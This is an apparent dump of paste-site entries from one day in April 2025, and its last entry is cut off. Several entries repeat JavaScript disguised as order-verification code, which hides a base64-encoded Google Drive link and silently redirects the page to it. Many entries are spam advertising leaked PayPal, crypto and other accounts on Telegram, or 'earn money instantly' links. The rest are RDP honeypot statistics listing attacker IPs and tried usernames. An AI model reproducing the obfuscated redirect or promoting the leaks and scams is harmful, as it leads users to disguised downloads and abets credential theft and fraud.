id,title,username,language,date,content
MAxgzmjW,Market.js,kammex,JavaScript,Monday 28th of April 2025 07:19:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57136/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4ktQk2gT,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:18:25 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 13671,
    ""159.89.6.147"": 3330,
    ""211.185.207.14"": 60,
    ""71.82.170.60"": 21,
    ""80.94.95.198"": 30,
    ""205.210.31.220"": 9,
    ""111.89.163.100"": 27,
    ""193.176.22.13"": 24,
    ""45.227.254.130"": 9,
    ""88.214.25.121"": 6,
    ""157.245.104.150"": 3,
    ""45.227.254.151"": 6,
    ""88.214.50.50"": 36,
    ""167.99.148.88"": 12,
    ""80.94.95.90"": 6,
    ""45.79.0.24"": 3,
    ""62.60.188.24"": 9,
    ""198.235.24.216"": 9,
    ""102.88.21.212"": 3,
    ""102.88.21.214"": 3,
    ""196.25.93.44"": 3,
    ""23.92.31.45"": 12,
    ""45.33.120.129"": 3,
    ""221.181.44.30"": 6,
    ""205.210.31.110"": 9,
    ""191.252.2.116"": 555,
    ""173.230.129.193"": 72,
    ""165.154.138.85"": 3,
    ""181.30.39.44"": 6,
    ""143.198.126.238"": 513,
    ""171.254.94.252"": 3,
    ""89.248.161.40"": 3,
    ""91.238.181.96"": 6,
    ""92.53.15.159"": 3,
    ""198.235.24.95"": 9,
    ""194.165.16.166"": 6,
    ""103.97.93.115"": 27
  },
  ""asn"": {
    ""AS51167"": 13671,
    ""AS14061"": 3858,
    ""AS4766"": 60,
    ""AS20115"": 21,
    ""AS204428"": 36,
    ""AS396982"": 36,
    ""AS2514"": 27,
    ""Unknown"": 60,
    ""AS267784"": 15,
    ""AS35042"": 6,
    ""AS63949"": 90,
    ""AS215930"": 9,
    ""AS29465"": 6,
    ""AS5713"": 3,
    ""AS9808"": 6,
    ""AS27715"": 555,
    ""AS135377"": 3,
    ""AS7303"": 6,
    ""AS7552"": 3,
    ""AS202425"": 3,
    ""AS49434"": 6,
    ""AS43612"": 3,
    ""AS48721"": 6,
    ""AS134053"": 27
  },
  ""isp"": {
    ""Contabo GmbH"": 13671,
    ""DigitalOcean, LLC"": 3858,
    ""Korea Telecom"": 60,
    ""Charter Communications"": 21,
    ""SS-Net"": 36,
    ""Google LLC"": 36,
    ""NTT PC Communications, Inc."": 27,
    ""SIA \""Singularity Telecom\"""": 60,
    ""Flyservers S.A."": 21,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Akamai Technologies, Inc."": 90,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 9,
    ""MTN NIGERIA Communication limited"": 6,
    ""Telkom SA Ltd."": 3,
    ""China Mobile communications corporation"": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 555,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Telecom Argentina S.A"": 6,
    ""Viettel Corporation"": 3,
    ""IP Volume inc"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 27
  },
  ""org"": {
    ""Contabo GmbH"": 13671,
    ""DigitalOcean, LLC"": 3846,
    ""Kornet"": 60,
    ""Spectrum"": 21,
    ""Unmanaged LTD"": 36,
    ""Palo Alto Networks, Inc"": 36,
    ""InfoSphere"": 27,
    ""SIA \""Singularity Telecom\"""": 60,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Digital Ocean"": 12,
    ""Linode"": 90,
    ""UAB Host Baltic"": 9,
    ""MTN Nigeria"": 6,
    ""Netline"": 3,
    ""China Mobile"": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 555,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Fibertel"": 6,
    ""VIETEL"": 3,
    ""IP Volume inc"": 3,
    ""Global Communication Net EAD"": 3,
    ""Flyservers S.A"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 27
  },
  ""regionName"": {
    ""Grand Est"": 13671,
    ""Hesse"": 3333,
    ""Sejong-si"": 60,
    ""Wisconsin"": 21,
    ""Budapest"": 36,
    ""California"": 36,
    ""Tokyo"": 27,
    ""New York"": 60,
    ""Vilnius"": 15,
    ""Kowloon City"": 6,
    ""Karnataka"": 3,
    ""New Jersey"": 525,
    ""Texas"": 6,
    ""Tehran"": 9,
    ""Lagos"": 6,
    ""Eastern Cape"": 3,
    ""Georgia"": 84,
    ""Guangdong"": 6,
    ""S\u00e3o Paulo"": 555,
    ""Buenos Aires F.D."": 6,
    ""Hanoi"": 3,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 6,
    ""Grad Skopje"": 3,
    ""Kaunas"": 6,
    ""Goa"": 27
  },
  ""country"": {
    ""France"": 13677,
    ""Germany"": 3333,
    ""South Korea"": 60,
    ""United States"": 732,
    ""Hungary"": 36,
    ""Japan"": 27,
    ""Lithuania"": 21,
    ""Hong Kong"": 6,
    ""India"": 30,
    ""Iran"": 9,
    ""Nigeria"": 6,
    ""South Africa"": 3,
    ""China"": 6,
    ""Brazil"": 555,
    ""Argentina"": 6,
    ""Vietnam"": 3,
    ""The Netherlands"": 3,
    ""North Macedonia"": 3
  },
  ""account"": {
    ""hello"": 18207,
    ""142.93.8.59"": 138,
    ""hjwhOhnVj"": 3,
    ""kbIDuH"": 3,
    ""VcsEHn"": 3,
    ""Test"": 36,
    ""Domain"": 57,
    ""h31icym2"": 12,
    ""Administr"": 6,
    ""beio"": 6,
    ""jbeibeUQW"": 3,
    ""kFoEBY"": 3,
    ""GqZuup"": 3,
    ""hdiu0oy2"": 12,
    ""shacOjApK"": 3,
    ""mRLosF"": 3,
    ""fBoDMC"": 3,
    ""Administrator"": 3,
    ""(empty)"": 3,
    ""WsJJyKasv"": 3,
    ""tUOHfh"": 3,
    ""JwPnUG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 18516
  },
  ""client_build"": {
    ""Unknown"": 18516
  },
  ""client_name"": {
    ""Unknown"": 18516
  },
  ""ip_type"": {
    ""hosting"": 18216,
    ""Unknown"": 285,
    ""hosting & proxy"": 3,
    ""mobile & hosting"": 6,
    ""mobile"": 6
  }
}"
YiDhw3Rk,Make $1000 15-MINUTES (BEGINNER) L4,idk78909,JavaScript,Monday 28th of April 2025 07:17:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

DqXtou9NLS
"
7QtfFeAY,Crypto Accounts,dentira,JavaScript,Monday 28th of April 2025 07:16:24 PM CDT,39000 Accounts Posted On https://t.me/leakzbyeminem
H8zgB6wM,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:16:13 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 9114,
    ""159.89.6.147"": 2220,
    ""211.185.207.14"": 40,
    ""71.82.170.60"": 14,
    ""80.94.95.198"": 20,
    ""205.210.31.220"": 6,
    ""111.89.163.100"": 18,
    ""193.176.22.13"": 16,
    ""45.227.254.130"": 6,
    ""88.214.25.121"": 4,
    ""157.245.104.150"": 2,
    ""45.227.254.151"": 4,
    ""88.214.50.50"": 24,
    ""167.99.148.88"": 8,
    ""80.94.95.90"": 4,
    ""45.79.0.24"": 2,
    ""62.60.188.24"": 6,
    ""198.235.24.216"": 6,
    ""102.88.21.212"": 2,
    ""102.88.21.214"": 2,
    ""196.25.93.44"": 2,
    ""23.92.31.45"": 8,
    ""45.33.120.129"": 2,
    ""221.181.44.30"": 4,
    ""205.210.31.110"": 6,
    ""191.252.2.116"": 370,
    ""173.230.129.193"": 48,
    ""165.154.138.85"": 2,
    ""181.30.39.44"": 4,
    ""143.198.126.238"": 342,
    ""171.254.94.252"": 2,
    ""89.248.161.40"": 2,
    ""91.238.181.96"": 4,
    ""92.53.15.159"": 2,
    ""198.235.24.95"": 6,
    ""194.165.16.166"": 4,
    ""103.97.93.115"": 18
  },
  ""asn"": {
    ""AS51167"": 9114,
    ""AS14061"": 2572,
    ""AS4766"": 40,
    ""AS20115"": 14,
    ""AS204428"": 24,
    ""AS396982"": 24,
    ""AS2514"": 18,
    ""Unknown"": 40,
    ""AS267784"": 10,
    ""AS35042"": 4,
    ""AS63949"": 60,
    ""AS215930"": 6,
    ""AS29465"": 4,
    ""AS5713"": 2,
    ""AS9808"": 4,
    ""AS27715"": 370,
    ""AS135377"": 2,
    ""AS7303"": 4,
    ""AS7552"": 2,
    ""AS202425"": 2,
    ""AS49434"": 4,
    ""AS43612"": 2,
    ""AS48721"": 4,
    ""AS134053"": 18
  },
  ""isp"": {
    ""Contabo GmbH"": 9114,
    ""DigitalOcean, LLC"": 2572,
    ""Korea Telecom"": 40,
    ""Charter Communications"": 14,
    ""SS-Net"": 24,
    ""Google LLC"": 24,
    ""NTT PC Communications, Inc."": 18,
    ""SIA \""Singularity Telecom\"""": 40,
    ""Flyservers S.A."": 14,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Akamai Technologies, Inc."": 60,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""MTN NIGERIA Communication limited"": 4,
    ""Telkom SA Ltd."": 2,
    ""China Mobile communications corporation"": 4,
    ""Locaweb Servi\u00e7os de Internet S/A"": 370,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Telecom Argentina S.A"": 4,
    ""Viettel Corporation"": 2,
    ""IP Volume inc"": 2,
    ""Datacenter location PAR1 France"": 4,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 18
  },
  ""org"": {
    ""Contabo GmbH"": 9114,
    ""DigitalOcean, LLC"": 2564,
    ""Kornet"": 40,
    ""Spectrum"": 14,
    ""Unmanaged LTD"": 24,
    ""Palo Alto Networks, Inc"": 24,
    ""InfoSphere"": 18,
    ""SIA \""Singularity Telecom\"""": 40,
    ""Xwin Universal LTD"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Digital Ocean"": 8,
    ""Linode"": 60,
    ""UAB Host Baltic"": 6,
    ""MTN Nigeria"": 4,
    ""Netline"": 2,
    ""China Mobile"": 4,
    ""Locaweb Servi\u00e7os de Internet S/A"": 370,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Fibertel"": 4,
    ""VIETEL"": 2,
    ""IP Volume inc"": 2,
    ""Global Communication Net EAD"": 2,
    ""Flyservers S.A"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 18
  },
  ""regionName"": {
    ""Grand Est"": 9114,
    ""Hesse"": 2222,
    ""Sejong-si"": 40,
    ""Wisconsin"": 14,
    ""Budapest"": 24,
    ""California"": 24,
    ""Tokyo"": 18,
    ""New York"": 40,
    ""Vilnius"": 10,
    ""Kowloon City"": 4,
    ""Karnataka"": 2,
    ""New Jersey"": 350,
    ""Texas"": 4,
    ""Tehran"": 6,
    ""Lagos"": 4,
    ""Eastern Cape"": 2,
    ""Georgia"": 56,
    ""Guangdong"": 4,
    ""S\u00e3o Paulo"": 370,
    ""Buenos Aires F.D."": 4,
    ""Hanoi"": 2,
    ""North Holland"": 2,
    ""\u00cele-de-France"": 4,
    ""Grad Skopje"": 2,
    ""Kaunas"": 4,
    ""Goa"": 18
  },
  ""country"": {
    ""France"": 9118,
    ""Germany"": 2222,
    ""South Korea"": 40,
    ""United States"": 488,
    ""Hungary"": 24,
    ""Japan"": 18,
    ""Lithuania"": 14,
    ""Hong Kong"": 4,
    ""India"": 20,
    ""Iran"": 6,
    ""Nigeria"": 4,
    ""South Africa"": 2,
    ""China"": 4,
    ""Brazil"": 370,
    ""Argentina"": 4,
    ""Vietnam"": 2,
    ""The Netherlands"": 2,
    ""North Macedonia"": 2
  },
  ""account"": {
    ""hello"": 12138,
    ""142.93.8.59"": 92,
    ""hjwhOhnVj"": 2,
    ""kbIDuH"": 2,
    ""VcsEHn"": 2,
    ""Test"": 24,
    ""Domain"": 38,
    ""h31icym2"": 8,
    ""Administr"": 4,
    ""beio"": 4,
    ""jbeibeUQW"": 2,
    ""kFoEBY"": 2,
    ""GqZuup"": 2,
    ""hdiu0oy2"": 8,
    ""shacOjApK"": 2,
    ""mRLosF"": 2,
    ""fBoDMC"": 2,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""WsJJyKasv"": 2,
    ""tUOHfh"": 2,
    ""JwPnUG"": 2
  },
  ""keyboard"": {
    ""Unknown"": 12344
  },
  ""client_build"": {
    ""Unknown"": 12344
  },
  ""client_name"": {
    ""Unknown"": 12344
  },
  ""ip_type"": {
    ""hosting"": 12144,
    ""Unknown"": 190,
    ""hosting & proxy"": 2,
    ""mobile & hosting"": 4,
    ""mobile"": 4
  }
}"
GrXMV6wW,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 4557,
    ""159.89.6.147"": 1110,
    ""211.185.207.14"": 20,
    ""71.82.170.60"": 7,
    ""80.94.95.198"": 10,
    ""205.210.31.220"": 3,
    ""111.89.163.100"": 9,
    ""193.176.22.13"": 8,
    ""45.227.254.130"": 3,
    ""88.214.25.121"": 2,
    ""157.245.104.150"": 1,
    ""45.227.254.151"": 2,
    ""88.214.50.50"": 12,
    ""167.99.148.88"": 4,
    ""80.94.95.90"": 2,
    ""45.79.0.24"": 1,
    ""62.60.188.24"": 3,
    ""198.235.24.216"": 3,
    ""102.88.21.212"": 1,
    ""102.88.21.214"": 1,
    ""196.25.93.44"": 1,
    ""23.92.31.45"": 4,
    ""45.33.120.129"": 1,
    ""221.181.44.30"": 2,
    ""205.210.31.110"": 3,
    ""191.252.2.116"": 185,
    ""173.230.129.193"": 24,
    ""165.154.138.85"": 1,
    ""181.30.39.44"": 2,
    ""143.198.126.238"": 171,
    ""171.254.94.252"": 1,
    ""89.248.161.40"": 1,
    ""91.238.181.96"": 2,
    ""92.53.15.159"": 1,
    ""198.235.24.95"": 3,
    ""194.165.16.166"": 2,
    ""103.97.93.115"": 9
  },
  ""asn"": {
    ""AS51167"": 4557,
    ""AS14061"": 1286,
    ""AS4766"": 20,
    ""AS20115"": 7,
    ""AS204428"": 12,
    ""AS396982"": 12,
    ""AS2514"": 9,
    ""Unknown"": 20,
    ""AS267784"": 5,
    ""AS35042"": 2,
    ""AS63949"": 30,
    ""AS215930"": 3,
    ""AS29465"": 2,
    ""AS5713"": 1,
    ""AS9808"": 2,
    ""AS27715"": 185,
    ""AS135377"": 1,
    ""AS7303"": 2,
    ""AS7552"": 1,
    ""AS202425"": 1,
    ""AS49434"": 2,
    ""AS43612"": 1,
    ""AS48721"": 2,
    ""AS134053"": 9
  },
  ""isp"": {
    ""Contabo GmbH"": 4557,
    ""DigitalOcean, LLC"": 1286,
    ""Korea Telecom"": 20,
    ""Charter Communications"": 7,
    ""SS-Net"": 12,
    ""Google LLC"": 12,
    ""NTT PC Communications, Inc."": 9,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Flyservers S.A."": 7,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Akamai Technologies, Inc."": 30,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""MTN NIGERIA Communication limited"": 2,
    ""Telkom SA Ltd."": 1,
    ""China Mobile communications corporation"": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 185,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Telecom Argentina S.A"": 2,
    ""Viettel Corporation"": 1,
    ""IP Volume inc"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 1,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Contabo GmbH"": 4557,
    ""DigitalOcean, LLC"": 1282,
    ""Kornet"": 20,
    ""Spectrum"": 7,
    ""Unmanaged LTD"": 12,
    ""Palo Alto Networks, Inc"": 12,
    ""InfoSphere"": 9,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Xwin Universal LTD"": 5,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Digital Ocean"": 4,
    ""Linode"": 30,
    ""UAB Host Baltic"": 3,
    ""MTN Nigeria"": 2,
    ""Netline"": 1,
    ""China Mobile"": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 185,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Fibertel"": 2,
    ""VIETEL"": 1,
    ""IP Volume inc"": 1,
    ""Global Communication Net EAD"": 1,
    ""Flyservers S.A"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""Grand Est"": 4557,
    ""Hesse"": 1111,
    ""Sejong-si"": 20,
    ""Wisconsin"": 7,
    ""Budapest"": 12,
    ""California"": 12,
    ""Tokyo"": 9,
    ""New York"": 20,
    ""Vilnius"": 5,
    ""Kowloon City"": 2,
    ""Karnataka"": 1,
    ""New Jersey"": 175,
    ""Texas"": 2,
    ""Tehran"": 3,
    ""Lagos"": 2,
    ""Eastern Cape"": 1,
    ""Georgia"": 28,
    ""Guangdong"": 2,
    ""S\u00e3o Paulo"": 185,
    ""Buenos Aires F.D."": 2,
    ""Hanoi"": 1,
    ""North Holland"": 1,
    ""\u00cele-de-France"": 2,
    ""Grad Skopje"": 1,
    ""Kaunas"": 2,
    ""Goa"": 9
  },
  ""country"": {
    ""France"": 4559,
    ""Germany"": 1111,
    ""South Korea"": 20,
    ""United States"": 244,
    ""Hungary"": 12,
    ""Japan"": 9,
    ""Lithuania"": 7,
    ""Hong Kong"": 2,
    ""India"": 10,
    ""Iran"": 3,
    ""Nigeria"": 2,
    ""South Africa"": 1,
    ""China"": 2,
    ""Brazil"": 185,
    ""Argentina"": 2,
    ""Vietnam"": 1,
    ""The Netherlands"": 1,
    ""North Macedonia"": 1
  },
  ""account"": {
    ""hello"": 6069,
    ""142.93.8.59"": 46,
    ""hjwhOhnVj"": 1,
    ""kbIDuH"": 1,
    ""VcsEHn"": 1,
    ""Test"": 12,
    ""Domain"": 19,
    ""h31icym2"": 4,
    ""Administr"": 2,
    ""beio"": 2,
    ""jbeibeUQW"": 1,
    ""kFoEBY"": 1,
    ""GqZuup"": 1,
    ""hdiu0oy2"": 4,
    ""shacOjApK"": 1,
    ""mRLosF"": 1,
    ""fBoDMC"": 1,
    ""Administrator"": 1,
    ""(empty)"": 1,
    ""WsJJyKasv"": 1,
    ""tUOHfh"": 1,
    ""JwPnUG"": 1
  },
  ""keyboard"": {
    ""Unknown"": 6172
  },
  ""client_build"": {
    ""Unknown"": 6172
  },
  ""client_name"": {
    ""Unknown"": 6172
  },
  ""ip_type"": {
    ""hosting"": 6072,
    ""Unknown"": 95,
    ""hosting & proxy"": 1,
    ""mobile & hosting"": 2,
    ""mobile"": 2
  }
}"
yG4Rc24e,EARN $900 INSTANTLY 2025⭐ GV,idk78909,JavaScript,Monday 28th of April 2025 07:08:14 PM CDT," 
Pdf https://tinyurl.com/freshleaks

nRBZ6b3zr3
"
2VJh8Uvw,Untitled,kammex,JavaScript,Monday 28th of April 2025 07:04:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iSMECfnt,PayPal with Balance,dentira,JavaScript,Monday 28th of April 2025 07:01:02 PM CDT,69287 Accounts Posted On https://t.me/leakzbyeminem
vVqVKr49,Make $1000 15-MINUTES  (BEGINNER) YR,idk78909,JavaScript,Monday 28th of April 2025 06:59:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

zDPRsNeVGW
"
ekpSxRaQ,EARN $900 INSTANTLY 2025 95,idk78909,JavaScript,Monday 28th of April 2025 06:49:47 PM CDT," 
Pdf https://tinyurl.com/freshleaks

GWK0u2T4wi
"
isn16HSb,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 06:45:34 PM CDT,24664 Accounts Posted On https://t.me/leakzbyeminem
r0FnuYMB,Make $1000 15-MINUTES (BEGINNER) L4,idk78909,JavaScript,Monday 28th of April 2025 06:40:32 PM CDT," 
Pdf https://tinyurl.com/freshleaks

7miViCv7Rz
"
XFUdCchu,Untitled,dentira,JavaScript,Monday 28th of April 2025 06:33:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89245/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4fcSAMYr,EARN $900 INSTANTLY 2025⭐ GV,gfhiugyr8g,JavaScript,Monday 28th of April 2025 06:30:50 PM CDT," 
Pdf https://tinyurl.com/freshleaks

3DzwPRi7Dw
"
6Vxswwfz,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 06:30:12 PM CDT,48808 Accounts Posted On https://t.me/leakzbyeminem
KXYEXGHy,Products.js,dentira,JavaScript,Monday 28th of April 2025 06:17:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14952/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W1ke5Xqa,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Monday 28th of April 2025 06:14:50 PM CDT,55575 Accounts Posted On https://t.me/leakzbyeminem
m6JBbave,Order.js,dentira,JavaScript,Monday 28th of April 2025 06:02:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11571/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KjnHTRBR,Chaturbate with Tokens,Epiphemeral,JavaScript,Monday 28th of April 2025 05:59:27 PM CDT,28995 Accounts Posted On https://t.me/leakzbyeminem
Gb3Uakjp,Market.js,dentira,JavaScript,Monday 28th of April 2025 05:46:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45918/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pTMxh1n2,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 05:44:06 PM CDT,75988 Accounts Posted On https://t.me/leakzbyeminem
Ak0UTsXQ,Untitled,dentira,JavaScript,Monday 28th of April 2025 05:31:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31261/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8aVmhjSB,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 05:28:44 PM CDT,91998 Accounts Posted On https://t.me/leakzbyeminem
itrUwdmZ,Products.js,dentira,JavaScript,Monday 28th of April 2025 05:16:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02834/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
